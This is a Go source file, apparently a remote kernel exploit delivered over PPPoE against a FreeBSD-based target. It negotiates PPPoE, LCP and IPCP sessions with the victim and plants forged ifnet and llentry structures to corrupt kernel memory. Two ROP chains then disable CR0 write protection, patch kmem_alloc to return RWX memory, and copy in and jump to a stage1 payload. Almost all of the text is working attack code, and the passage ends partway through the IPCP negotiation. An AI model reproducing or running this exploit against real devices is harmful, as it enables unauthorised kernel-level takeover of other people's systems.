package main

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"runtime"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"github.com/akamensky/argparse"
)

// FreeBSD constants
const (
	NULL = 0

	PAGE_SIZE = 0x4000

	IDT_UD     = 6
	SDT_SYSIGT = 14
	SEL_KPL    = 0

	CR0_PE = 0x00000001
	CR0_MP = 0x00000002
	CR0_EM = 0x00000004
	CR0_TS = 0x00000008
	CR0_ET = 0x00000010
	CR0_NE = 0x00000020
	CR0_WP = 0x00010000
	CR0_AM = 0x00040000
	CR0_NW = 0x20000000
	CR0_CD = 0x40000000
	CR0_PG = 0x80000000

	CR0_ORI = CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_ET | CR0_TS | CR0_MP | CR0_PE

	VM_PROT_READ    = 0x01
	VM_PROT_WRITE   = 0x02
	VM_PROT_EXECUTE = 0x04

	VM_PROT_ALL = VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE

	LLE_STATIC    = 0x0002
	LLE_LINKED    = 0x0040
	LLE_EXCLUSIVE = 0x2000

	LO_INITIALIZED = 0x00010000
	LO_WITNESS     = 0x00020000
	LO_UPGRADABLE  = 0x00200000
	LO_DUPOK       = 0x00400000

	LO_CLASSSHIFT = 24

	RW_UNLOCKED = 1
	MTX_UNOWNED = 4

	RW_INIT_FLAGS  = (4 << LO_CLASSSHIFT) | LO_INITIALIZED | LO_WITNESS | LO_UPGRADABLE
	MTX_INIT_FLAGS = (1 << LO_CLASSSHIFT) | LO_INITIALIZED | LO_WITNESS

	CALLOUT_RETURNUNLOCKED = 0x10

	AF_INET6 = 28

	IFT_ETHER = 0x6

	ND6_LLINFO_NOSTATE = 0xfffe

	// FreeBSD offsets
	TARGET_SIZE = 0x100

	PPPOE_SOFTC_SC_DEST      = 0x24
	PPPOE_SOFTC_SC_AC_COOKIE = 0x40
	PPPOE_SOFTC_SIZE         = 0x1c8

	LLTABLE_LLTIFP  = 0x110
	LLTABLE_LLTFREE = 0x118

	SOCKADDR_IN6_SIZE = 0x1c
)

const (
	SESSION_ID  = 0xffff
	LCP_ID      = 0x41
	IPCP_ID     = 0x41
	SPRAY_NUM   = 0x1000
	PIN_NUM     = 0x1000
	CORRUPT_NUM = 0x1
	HOLE_START  = 0x400
	HOLE_SPACE  = 0x10

	STAGE2_PORT = 9020

	SOURCE_IPV4 = "41.41.41.41"
	SOURCE_IPV6 = "fe80::4141:4141:4141:4141"

	TARGET_IPV4 = "42.42.42.42"

	BPF_FILTER = "((ip6) || (pppoed) || (pppoes && !ip))"
)

func NewLcpEchoHandler(iface string) {
	handle, err := pcap.OpenLive(iface, 2048, true, pcap.BlockForever)
	if err != nil {
		log.Println("[-] Error opening device:", err)
		return
	}

	handle.SetDirection(pcap.DirectionIn)

	if err := handle.SetBPFFilter("pppoes && !ip"); err != nil {
		log.Println("[-] Error setting BPF filter:", err)
		return
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	packetSource.NoCopy = true
	packetSource.Lazy = true
	packetSource.DecodeStreamsAsDatagrams = true

	for p := range packetSource.Packets() {
		originalEthLayer := p.Layer(layers.LayerTypeEthernet)
		originalLCPLayer := p.Layer(layers.LayerTypeLCP)

		if originalLCPLayer == nil || originalLCPLayer.(*layers.PPPLCP).Code != layers.LCP_ECHO_REQUEST {
			continue
		}

		fmt.Println("[+] Received LCP Echo Request")

		ethLayer := &layers.Ethernet{
			SrcMAC:       originalEthLayer.(*layers.Ethernet).DstMAC,
			DstMAC:       originalEthLayer.(*layers.Ethernet).SrcMAC,
			EthernetType: layers.EthernetTypePPPoESession,
		}

		pppoeLayer := &layers.PPPoE{
			Version:   1,
			Type:      1,
			Code:      0,
			SessionId: p.Layer(layers.LayerTypePPPoE).(*layers.PPPoE).SessionId,
			Length:    0,
		}

		pppLayer := &layers.PPP{
			PPPType: layers.PPPLinkControlProtocol,
		}

		pppLCP := &layers.PPPLCP{
			Code:        layers.LCO_ECHO_REPLY,
			Identifier:  originalLCPLayer.(*layers.PPPLCP).Identifier,
			Length:      originalLCPLayer.(*layers.PPPLCP).Length,
			MagicNumber: originalLCPLayer.(*layers.PPPLCP).MagicNumber,
		}

		pkt, err := SerializeLayers(ethLayer, pppoeLayer, pppLayer, pppLCP)
		if err != nil {
			log.Println("[-] Error crafting packet:", err)
			continue
		}

		fmt.Println("[+] Sending LCP Echo Reply")
		if err := handle.WritePacketData(pkt); err != nil {
			log.Println("[-] Error sending packet:", err)
		}
	}
}

type BuildCookie func() []byte

func (e *Exploit) buildFakeIfnet() []byte {
	// Leak address
	planted := (e.pppoe_softc + 0x07) & 0xffffffffffff
	e.sourceMAC, _ = net.ParseMAC(Uint64ToMAC(planted))
	fmt.Printf("[+] Source MAC: %s\n", e.sourceMAC)

	// Fake ifnet
	fakeIfnet := make([]byte, 0)

	fakeIfnet = append(fakeIfnet, BytesRepeat('A', 0x48-len(fakeIfnet))...)
	fakeIfnet = append(fakeIfnet, Uint64ToBytes(NULL)...)
	fakeIfnet = append(fakeIfnet, BytesRepeat('A', 0x70-len(fakeIfnet))...)
	fakeIfnet = append(fakeIfnet, Uint16ToBytes(0x0001)...) // if_index
	fakeIfnet = append(fakeIfnet, BytesRepeat('A', 0xa0-len(fakeIfnet))...)
	fakeIfnet = append(fakeIfnet, byte(IFT_ETHER)) // ifi_type
	fakeIfnet = append(fakeIfnet, byte(0))         // ifi_physical
	fakeIfnet = append(fakeIfnet, byte(0x8+0x1))   // ifi_addrlen
	fakeIfnet = append(fakeIfnet, BytesRepeat('A', 0x1b8-len(fakeIfnet))...)
	fakeIfnet = append(fakeIfnet, Uint64ToBytes(e.pppoe_softc+PPPOE_SOFTC_SC_DEST)...) // if_addr
	fakeIfnet = append(fakeIfnet, BytesRepeat('A', 0x428-len(fakeIfnet))...)
	fakeIfnet = append(fakeIfnet, Uint64ToBytes(e.pppoe_softc+0x10-0x8)...) // nd_ifinfo

	// if_afdata_lock
	fakeIfnet = append(fakeIfnet, BytesRepeat('A', 0x480-len(fakeIfnet))...)
	fakeIfnet = append(fakeIfnet, Uint64ToBytes(NULL)...)          // lo_name
	fakeIfnet = append(fakeIfnet, Uint32ToBytes(RW_INIT_FLAGS)...) // lo_flags
	fakeIfnet = append(fakeIfnet, Uint32ToBytes(0)...)             // lo_data
	fakeIfnet = append(fakeIfnet, Uint64ToBytes(NULL)...)          // lo_witness
	fakeIfnet = append(fakeIfnet, Uint64ToBytes(RW_UNLOCKED)...)   // rw_lock

	// if_addr_mtx
	fakeIfnet = append(fakeIfnet, BytesRepeat('A', 0x4c0-len(fakeIfnet))...)
	fakeIfnet = append(fakeIfnet, Uint64ToBytes(NULL)...)           // lo_name
	fakeIfnet = append(fakeIfnet, Uint32ToBytes(MTX_INIT_FLAGS)...) // lo_flags
	fakeIfnet = append(fakeIfnet, Uint32ToBytes(0)...)              // lo_data
	fakeIfnet = append(fakeIfnet, Uint64ToBytes(NULL)...)           // lo_witness
	fakeIfnet = append(fakeIfnet, Uint64ToBytes(MTX_UNOWNED)...)    // mtx_lock

	return fakeIfnet
}

func (e *Exploit) buildOverflowLle() []byte {
	overflow_lle := make([]byte, 0)

	// lle_next
	overflow_lle = append(overflow_lle, Uint64ToBytes(e.pppoe_softc+PPPOE_SOFTC_SC_AC_COOKIE)...) // lle_next
	overflow_lle = append(overflow_lle, Uint64ToBytes(NULL)...)                                   // lle_prev

	// lle_lock
	overflow_lle = append(overflow_lle, Uint64ToBytes(NULL)...)                   // lo_name
	overflow_lle = append(overflow_lle, Uint32ToBytes(RW_INIT_FLAGS|LO_DUPOK)...) // lo_flags
	overflow_lle = append(overflow_lle, Uint32ToBytes(0)...)                      // lo_data
	overflow_lle = append(overflow_lle, Uint64ToBytes(NULL)...)                   // lo_witness
	overflow_lle = append(overflow_lle, Uint64ToBytes(RW_UNLOCKED)...)            // rw_lock

	overflow_lle = append(overflow_lle, Uint64ToBytes(e.pppoe_softc+PPPOE_SOFTC_SC_AC_COOKIE-
		LLTABLE_LLTIFP)...) // lle_tbl
	overflow_lle = append(overflow_lle, Uint64ToBytes(NULL)...)               // lle_head
	overflow_lle = append(overflow_lle, Uint64ToBytes(NULL)...)               // lle_free
	overflow_lle = append(overflow_lle, Uint64ToBytes(NULL)...)               // la_hold
	overflow_lle = append(overflow_lle, Uint32ToBytes(0)...)                  // la_numheld
	overflow_lle = append(overflow_lle, Uint32ToBytes(0)...)                  // pad
	overflow_lle = append(overflow_lle, Uint64ToBytes(0)...)                  // la_expire
	overflow_lle = append(overflow_lle, Uint16ToBytes(LLE_EXCLUSIVE)...)      // la_flags
	overflow_lle = append(overflow_lle, Uint16ToBytes(0)...)                  // la_asked
	overflow_lle = append(overflow_lle, Uint16ToBytes(0)...)                  // la_preempted
	overflow_lle = append(overflow_lle, Uint16ToBytes(0)...)                  // la_byint
	overflow_lle = append(overflow_lle, Uint16ToBytes(ND6_LLINFO_NOSTATE)...) // ln_state
	overflow_lle = append(overflow_lle, Uint16ToBytes(0)...)                  // ln_router
	overflow_lle = append(overflow_lle, Uint32ToBytes(0)...)                  // pad
	overflow_lle = append(overflow_lle, Uint64ToBytes(0x7fffffffffffffff)...) // ln_ntick

	return overflow_lle
}

func (e *Exploit) kdlsym(addr uint64) uint64 {
	return e.kaslr_offset + addr
}

func (e *Exploit) buildFakeLle() []byte {
	// First gadget - must be a valid MAC address
	// Upper bytes are encoded with SESSION_ID

	planted := e.kdlsym(e.offsets["FIRST_GADGET"]) & 0xffffffffffff
	e.sourceMAC, _ = net.ParseMAC(Uint64ToMAC(planted))
	fmt.Printf("[+] Source MAC: %s\n", e.sourceMAC)

	// Fake int6_llentry
	fake_lle := make([]byte, 0)

	// lle_next
	// Third gadget
	fake_lle = append(fake_lle, Uint64ToBytes(e.kdlsym(e.offsets["POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10"]))...) // lle_next
	fake_lle = append(fake_lle, Uint64ToBytes(NULL)...)                                                                // lle_prev

	// lle_lock
	// Fourth gadget
	fake_lle = append(fake_lle, Uint64ToBytes(e.kdlsym(e.offsets["LEA_RSP_RSI_20_REPZ_RET"]))...) // lo_name
	fake_lle = append(fake_lle, Uint32ToBytes(RW_INIT_FLAGS|LO_DUPOK)...)                         // lo_flags
	fake_lle = append(fake_lle, Uint32ToBytes(0)...)                                              // lo_data
	// Fifth gadget
	fake_lle = append(fake_lle, Uint64ToBytes(e.kdlsym(e.offsets["ADD_RSP_B0_POP_RBP_RET"]))...) // lo_witness
	fake_lle = append(fake_lle, Uint64ToBytes(RW_UNLOCKED)...)                                   // rw_lock

	fake_lle = append(fake_lle, Uint64ToBytes(e.pppoe_softc+PPPOE_SOFTC_SC_DEST-LLTABLE_LLTFREE)...) // lle_tbl
	fake_lle = append(fake_lle, Uint64ToBytes(NULL)...)                                              // lle_head
	fake_lle = append(fake_lle, Uint64ToBytes(NULL)...)                                              // lle_free
	fake_lle = append(fake_lle, Uint64ToBytes(NULL)...)                                              // la_hold
	fake_lle = append(fake_lle, Uint32ToBytes(0)...)                                                 // la_numheld
	fake_lle = append(fake_lle, Uint32ToBytes(0)...)                                                 // pad
	fake_lle = append(fake_lle, Uint64ToBytes(0)...)                                                 // la_expire
	fake_lle = append(fake_lle, Uint16ToBytes(LLE_STATIC|LLE_EXCLUSIVE)...)                          // la_flags
	fake_lle = append(fake_lle, Uint16ToBytes(0)...)                                                 // la_asked
	fake_lle = append(fake_lle, Uint16ToBytes(0)...)                                                 // la_preempted
	fake_lle = append(fake_lle, Uint16ToBytes(0)...)                                                 // la_byint
	fake_lle = append(fake_lle, Uint16ToBytes(ND6_LLINFO_NOSTATE)...)                                // ln_state
	fake_lle = append(fake_lle, Uint16ToBytes(0)...)                                                 // ln_router
	fake_lle = append(fake_lle, Uint32ToBytes(0)...)                                                 // pad
	fake_lle = append(fake_lle, Uint64ToBytes(0x7fffffffffffffff)...)                                // ln_ntick
	fake_lle = append(fake_lle, Uint32ToBytes(0)...)                                                 // lle_refcnt
	fake_lle = append(fake_lle, Uint32ToBytes(0)...)                                                 // pad
	fake_lle = append(fake_lle, Uint64ToBytesBe(0x414141414141)...)                                  // ll_addr

	// lle_timer
	fake_lle = append(fake_lle, Uint64ToBytes(0)...)                      // sle
	fake_lle = append(fake_lle, Uint64ToBytes(0)...)                      // tqe
	fake_lle = append(fake_lle, Uint32ToBytes(0)...)                      // c_time
	fake_lle = append(fake_lle, Uint32ToBytes(0)...)                      // pad
	fake_lle = append(fake_lle, Uint64ToBytes(NULL)...)                   // c_arg
	fake_lle = append(fake_lle, Uint64ToBytes(NULL)...)                   // c_func
	fake_lle = append(fake_lle, Uint64ToBytes(NULL)...)                   // c_lock
	fake_lle = append(fake_lle, Uint32ToBytes(CALLOUT_RETURNUNLOCKED)...) // c_flags
	fake_lle = append(fake_lle, Uint32ToBytes(0)...)                      // c_cpu

	// l3_addr6
	fake_lle = append(fake_lle, SOCKADDR_IN6_SIZE)   // sin6_len
	fake_lle = append(fake_lle, AF_INET6)            // sin6_family
	fake_lle = append(fake_lle, Uint16ToBytes(0)...) // sin6_port
	fake_lle = append(fake_lle, Uint32ToBytes(0)...) // sin6_flowinfo
	// sin6_addr
	fake_lle = append(fake_lle, Uint64ToBytesBe(0xfe80000100000000)...)
	fake_lle = append(fake_lle, Uint64ToBytesBe(0x4141414141414141)...)
	fake_lle = append(fake_lle, Uint32ToBytes(0)...)

	// pad
	fake_lle = append(fake_lle, Uint32ToBytes(0)...)

	if int(e.offsets["SECOND_GADGET_OFF"])+8 > len(fake_lle) {
		fake_lle = append(fake_lle, make([]byte, (int(e.offsets["SECOND_GADGET_OFF"])+8)-len(fake_lle))...)
	}
	// second gadget
	copy(fake_lle[int(e.offsets["SECOND_GADGET_OFF"]):int(e.offsets["SECOND_GADGET_OFF"])+8], Uint64ToBytes(e.kdlsym(e.offsets["PUSH_RBP_JMP_QWORD_PTR_RSI"])))

	// Second ROP chain
	rop2 := e.buildSecondRop()

	// First ROP chain
	rop := e.buildFirstRop(fake_lle, rop2)

	final := append(fake_lle, rop...)
	final = append(final, rop2...)
	final = append(final, e.stage1...)

	return final
}

func (e *Exploit) buildFirstRop(fake_lle []byte, rop2 []byte) []byte {
	rop := make([]byte, 0)

	// memcpy(RBX - 0x800, rop2, len(rop2 + stage1))

	// RDI = RBX - 0x800
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_R12_RET"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RBP_RET"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["MOV_RDI_RBX_CALL_R12"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RCX_RET"]))...)
	rop = append(rop, Uint64ToBytes(0xfffffffffffff800)...) // -0x800
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["ADD_RDI_RCX_RET"]))...)

	// RSI += len(fake_lle + rop)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RDX_RET"]))...)
	rop_off_fixup := len(rop)
	rop = append(rop, Uint64ToBytes(0xDEADBEEF)...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET"]))...)
	rop = append(rop, Uint64ToBytes(0xDEADBEEF)...)

	// RDX = len(rop2 + stage1)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RDX_RET"]))...)
	rop = append(rop, Uint64ToBytes(uint64(len(rop2)+len(e.stage1)))...)

	// Call memcpy
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["MEMCPY"]))...)

	// Stack pivot
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RAX_RET"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RBP_RET"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["MOV_RSI_RBX_CALL_RAX"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RDX_RET"]))...)
	rop = append(rop, Uint64ToBytes(0x800+0x20)...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET"]))...)
	rop = append(rop, Uint64ToBytes(0xdeadbeef)...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["LEA_RSP_RSI_20_REPZ_RET"]))...)

	copy(rop[rop_off_fixup:], Uint64ToBytes(-(uint64(len(fake_lle) + len(rop)))))

	return rop
}

func (e *Exploit) buildSecondRop() []byte {
	rop := make([]byte, 0)

	// setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RDI_RET"]))...)
	rop = append(rop, Uint64ToBytes(IDT_UD)...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RSI_RET"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["ADD_RSP_28_POP_RBP_RET"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RDX_RET"]))...)
	rop = append(rop, Uint64ToBytes(SDT_SYSIGT)...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RCX_RET"]))...)
	rop = append(rop, Uint64ToBytes(SEL_KPL)...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_R8_POP_RBP_RET"]))...)
	rop = append(rop, Uint64ToBytes(0)...)
	rop = append(rop, Uint64ToBytes(0xdeadbeef)...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["SETIDT"]))...)

	// Disable write protection
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RSI_RET"]))...)
	rop = append(rop, Uint64ToBytes(CR0_ORI&^CR0_WP)...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["MOV_CR0_RSI_UD2_MOV_EAX_1_RET"]))...)

	// Enable RWX in kmem_alloc
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RAX_RET"]))...)
	rop = append(rop, Uint64ToBytes(VM_PROT_ALL)...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RCX_RET"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["KMEM_ALLOC_PATCH1"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["MOV_BYTE_PTR_RCX_AL_RET"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RCX_RET"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["KMEM_ALLOC_PATCH2"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["MOV_BYTE_PTR_RCX_AL_RET"]))...)

	// Restore write protection
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RSI_RET"]))...)
	rop = append(rop, Uint64ToBytes(CR0_ORI)...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["MOV_CR0_RSI_UD2_MOV_EAX_1_RET"]))...)

	// kmem_alloc(*kernel_map, PAGE_SIZE)

	// RDI = *kernel_map
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RAX_RET"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["RET"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RDI_RET"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["KERNEL_MAP"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX"]))...)
	rop = append(rop, Uint64ToBytes(0xdeadbeef)...)

	// RSI = PAGE_SIZE
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RSI_RET"]))...)
	rop = append(rop, Uint64ToBytes(PAGE_SIZE)...)

	// Call kmem_alloc
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["KMEM_ALLOC"]))...)

	// R14 = RAX
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_R8_POP_RBP_RET"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RBP_RET"]))...)
	rop = append(rop, Uint64ToBytes(0xdeadbeef)...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["MOV_R14_RAX_CALL_R8"]))...)

	// memcpy(R14, stage1, len(stage1))

	// RDI = R14
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_R12_RET"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RBP_RET"]))...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["MOV_RDI_R14_CALL_R12"]))...)

	// RSI = RSP + len(rop) - rop_rsp_pos
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["PUSH_RSP_POP_RSI_RET"]))...)
	rop_rsp_pos := len(rop)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RDX_RET"]))...)
	rop_off_fixup := len(rop)
	rop = append(rop, Uint64ToBytes(0xdeadbeef)...)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET"]))...)
	rop = append(rop, Uint64ToBytes(0xdeadbeef)...)

	// RDX = len(stage1)
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["POP_RDX_RET"]))...)
	rop = append(rop, Uint64ToBytes(uint64(len(e.stage1)))...)

	// Call memcpy
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["MEMCPY"]))...)

	// Jump into stage1
	rop = append(rop, Uint64ToBytes(e.kdlsym(e.offsets["JMP_R14"]))...)

	copy(rop[rop_off_fixup:], Uint64ToBytes(-(uint64(len(rop) - rop_rsp_pos))))

	return rop
}

type Exploit struct {
	socket       *pcap.Handle
	stage1       []byte
	stage2       []byte
	offsets      map[string]uint64
	pppoe_softc  uint64
	kaslr_offset uint64
	sourceMAC    net.HardwareAddr
	targetMAC    net.HardwareAddr
	sourceIPv4   net.IP
	targetIPv4   net.IP
	targetIPv6   net.IP
	debug        bool
	packets      [][]string
}

// NewExploit creates a new instance of Exploit
func NewExploit(socket *pcap.Handle, stage1 []byte, stage2 []byte, offsets map[string]uint64, debug bool) *Exploit {
	return &Exploit{socket, stage1, stage2, offsets, 0, 0, nil, nil,
		net.ParseIP("41.41.41.41"), net.ParseIP("42.42.42.42"), net.ParseIP("::1"), debug, [][]string{}}
}

func (e *Exploit) GetPacket() gopacket.Packet {
	for {
		data, _, err := e.socket.ReadPacketData()

		if err == pcap.NextErrorTimeoutExpired {
			continue
		} else if err != nil {
			log.Printf("[-] Error reading packet: %v", err)
			continue
		}

		pkt := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.NoCopy)
		return pkt
	}
}

func (e *Exploit) GetPacketWithTypes(layerType ...gopacket.LayerType) gopacket.Packet {
	for {
		pkt := e.GetPacket()
		found := true
		for _, layerType := range layerType {
			if pkt.Layer(layerType) == nil {
				found = false
				break
			}
		}
		if found {
			return pkt
		}
	}
}

func (e *Exploit) GetPpoePacketWithCode(code layers.PPPoECode, layerType ...gopacket.LayerType) gopacket.Packet {
	layerTypes := append(layerType, layers.LayerTypeEthernet)
	layerTypes = append(layerTypes, layers.LayerTypePPPoE)
	layerTypes = append(layerTypes, layerType...)

	for {
		pkt := e.GetPacketWithTypes(layerTypes...)

		pppoeLayer := pkt.Layer(layers.LayerTypePPPoE).(*layers.PPPoE)
		if pppoeLayer.Code == code {
			return pkt
		}
	}
}

func (e *Exploit) GetPPPPacketWithLCPCode(code layers.LCPCode) gopacket.Packet {
	for {
		pkt := e.GetPacketWithTypes(layers.LayerTypePPP)
		pppLayer := pkt.Layer(layers.LayerTypePPP).(*layers.PPP)
		if pppLayer.Payload[0] == byte(code) {
			return pkt
		}
	}
}

func (e *Exploit) GetPPPPacketWithIPCPCode(code layers.IPCPCode) gopacket.Packet {
	for {
		pkt := e.GetPacketWithTypes(layers.LayerTypePPP, layers.LayerTypePPPIPCP)
		pppLayer := pkt.Layer(layers.LayerTypePPPIPCP).(*layers.PPPIPCP)
		if pppLayer.Code == code {
			return pkt
		}
	}
}

func (e *Exploit) SendPacket(pkt []byte) {
	if e.debug {
		_, file, no, ok := runtime.Caller(1)
		if !ok {
			file = "???"
			no = 0
		}
		caller := fmt.Sprintf("%s:%d", file, no)
		e.packets = append(e.packets, []string{"send", caller, hex.EncodeToString(pkt)})
	}
	e.socket.WritePacketData(pkt)
}

func (e *Exploit) LogRecvPacket(pkt gopacket.Packet) {
	if !e.debug {
		return
	}
	_, file, no, ok := runtime.Caller(1)
	if !ok {
		file = "???"
		no = 0
	}
	caller := fmt.Sprintf("%s:%d", file, no)
	e.packets = append(e.packets, []string{"recv", caller, hex.EncodeToString(pkt.Data())})
}

func (e *Exploit) PppNegotation(cb BuildCookie) bool {
	fmt.Println("[+] Waiting for PADI...")

	padi_pkt := e.GetPpoePacketWithCode(layers.PPPoECodePADI, layers.LayerTypePPPoETags)
	e.LogRecvPacket(padi_pkt)
	originalEthLayer := padi_pkt.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
	ppoe_tags_layer := padi_pkt.Layer(layers.LayerTypePPPoETags)

	e.socket.SetBPFFilter("(ether src " + originalEthLayer.SrcMAC.String() + ") && " + BPF_FILTER)

	host_unique := ppoe_tags_layer.(*layers.PPPoETags).GetPPPoETagValue(layers.PPPOETAG_HOSTUNIQ)
	if host_unique == nil {
		log.Println("[-] Host Uniq tag not found")
		return false
	}
	e.pppoe_softc = BytesToUint64(host_unique)

	fmt.Printf("[+] Host Uniq: %v\n", host_unique)
	fmt.Printf("[+] PPPoE softc: %x\n", e.pppoe_softc)

	e.targetMAC = originalEthLayer.SrcMAC
	fmt.Printf("[+] Target MAC: %s\n", e.targetMAC)

	e.sourceMAC, _ = net.ParseMAC("41:41:41:41:41:41")

	var ac_cookie = []byte{}
	if cb != nil {
		ac_cookie = cb()
	}

	pkt, err := PpoePacket(e.sourceMAC, e.targetMAC,
		layers.EthernetTypePPPoEDiscovery, layers.PPPoECodePADO, 0, &layers.PPPoETags{
			Tags: []layers.PPPoETag{
				{
					Type:  layers.PPPOETAG_HOSTUNIQ,
					Value: host_unique,
				},
				{
					Type:  layers.PPPOETAG_ACCOOKIE,
					Value: ac_cookie,
				},
			},
		})
	if err != nil {
		log.Println("[-] Error crafting packet:", err)
		return false
	}

	fmt.Println("[+] Sending PADO...")
	e.SendPacket(pkt)

	fmt.Println("[+] Waiting for PADR...")
	currentPacket := e.GetPpoePacketWithCode(layers.PPPoECodePADR)
	e.LogRecvPacket(currentPacket)

	pkt, err = PpoePacket(e.sourceMAC, e.targetMAC,
		layers.EthernetTypePPPoEDiscovery, layers.PPPoECodePADS, SESSION_ID, &layers.PPPoETags{
			Tags: []layers.PPPoETag{
				{
					Type:  layers.PPPOETAG_HOSTUNIQ,
					Value: host_unique,
				},
			},
		})
	if err != nil {
		log.Println("[-] Error crafting packet:", err)
		return false
	}

	fmt.Println("[+] Sending PADS...")
	e.SendPacket(pkt)

	return true
}

func (e *Exploit) LcpNegociation() bool {
	pkt, err := PpoeLCP(e.sourceMAC, e.targetMAC, SESSION_ID, layers.LCP_CONF_REQUEST, LCP_ID)
	if err != nil {
		log.Println("[-] Error crafting packet:", err)
		return false
	}
	fmt.Printf("[*] Sending LCP configure request...\n")
	e.SendPacket(pkt)

	fmt.Println("[*] Waiting for LCP configure ACK...")
	currentPacket := e.GetPPPPacketWithLCPCode(layers.LCP_CONF_ACK)
	e.LogRecvPacket(currentPacket)

	fmt.Println("[*] Waiting for LCP configure request...")
	currentPacket = e.GetPPPPacketWithLCPCode(layers.LCP_CONF_REQUEST)
	e.LogRecvPacket(currentPacket)

	ppp_layer := currentPacket.Layer(layers.LayerTypePPP)
	identifier := ppp_layer.(*layers.PPP).Payload[1]

	pkt, err = PpoeLCP(e.sourceMAC, e.targetMAC, SESSION_ID, layers.LCP_CONF_ACK, identifier)
	if err != nil {
		log.Println("[-] Error crafting packet:", err)
		return false
	}
	fmt.Printf("[*] Sending LCP configure ACK...\n")
	e.SendPacket(pkt)

	return true
}

func (e *Exploit) IpcpNegociation() {
	pkt, err := PpoeIPCP(e.sourceMAC, e.targetMAC, SESSION_ID,
		layers.IPCP_CONF_REQUEST, IPCP_ID, []layers.IPCPOption{
			layers.NewIPAddressOption(e.sourceIPv4),
		})
	if err != nil {
		log.Println("[-] Error crafting packet:", err)
		return
	}
	fmt.Println("[*] Sending IPCP configure request...")
	e.SendPacket(pkt)

	fmt.Println("[*] Waiting for IPCP configure ACK...")
	currentPacket := e.GetPPPPacketWithIPCPCode(layers.IPCP_CONF_ACK)
	e.LogRecvPacket(currentPacket)

	fmt.Println("[*] Waiting for IPCP configure request...")
	currentPacket = e.GetPPPPacketWithIPCPCode(layers.IPCP_CONF_REQUEST)
	e.LogRecvPacket(currentPacket)

	packetIPCP := currentPacket.Layer(layers.LayerTypePPPIPCP)
	req_identifier := packetIPCP.(*layers.PPPIPCP).Identifier

	pkt, err = PpoeIPCP(e.sourceMAC, e.targetMAC, SESSION_ID, layers.IPCP_CONF_NAK, req_identifier,
		[]layers.IPCPOption{
			layers.NewIPAddressOption(e.targetIPv4),
		})
	if err != nil {
		log.Println("[-] Error crafting packet:", err)
		return
	}

